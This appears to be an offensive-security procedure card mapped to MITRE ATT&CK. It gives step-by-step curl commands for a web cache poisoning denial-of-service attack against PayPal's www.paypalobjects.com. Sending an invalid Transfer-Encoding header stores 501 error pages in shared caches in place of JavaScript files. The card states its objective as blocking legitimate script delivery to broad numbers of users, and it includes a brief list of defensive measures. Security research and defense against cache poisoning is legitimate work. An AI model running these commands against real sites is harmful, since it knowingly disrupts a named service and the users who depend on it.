---
id: proc-paypal-cache-poison-js
tags:
  - web-cache-poisoning
  - dos
  - javascript
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-cache-poison-js]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:27:02.993Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# Poison-Cache-for-JavaScript-Resources

## Summary

This procedure exploits the invalid Transfer-Encoding header to poison shared web caches, replacing responses for JavaScript files on subdomains like www.paypalobjects.com with 501 error pages, disrupting resource delivery.

## Description

Building on the initial request, this step targets cached resources by sending poisoned requests that cause the cache to store error responses for JS files. In PayPal's case, this affected core scripts, breaking site functionality for cached users. The attack relies on unkeyed or misconfigured caches that include headers in storage decisions. Prerequisites include successful Step 1; outcomes include persistent cache contamination until eviction.

## Requirements

1. Confirmed vulnerability from prior header test
2. Knowledge of target resources (e.g., JS paths on subdomains)
3. Ability to send multiple requests to influence cache layers

## Defense

Defensive measures and detection strategies:

- Use cache-busting tokens or Vary headers to prevent poisoning
- Deploy cache validation to reject error responses for static assets
- Log and alert on unusual cache storage of 5xx errors for JS files

## Objectives

1. Contaminate cache with poisoned JS responses
2. Ensure broad impact across shared cache users
3. Block legitimate JS delivery

## Instructions

### Step 1: Target Specific JS Resource

**Context**: Send a poisoned request to a known JS endpoint to store the 501 response in cache.

**Command** ([[commands/curl-cache-poison-js]]):
```bash
curl https://www.paypalobjects.com/path/to/script.js -H "Transfer-Encoding: invalid" -v
```

> The request uses the invalid header to trigger the error, which gets cached. Verbose output shows if the response is generated. Expected: 501 stored for future hits.

### Step 2: Verify Cache Poisoning

**Context**: Test from a separate client to confirm the poison persists in shared cache.

**Command** ([[commands/curl-cache-poison-js]]):
```bash
curl https://www.paypalobjects.com/path/to/script.js -v
```

> Without the header, a cache hit should return the 501. If it does, poisoning succeeded; otherwise, retry or target different paths.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Network Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/curl-cache-poison-js]]

## Tools Used

- [[tools/curl]]

## Tags

- web-cache-poisoning
- dos
- javascript
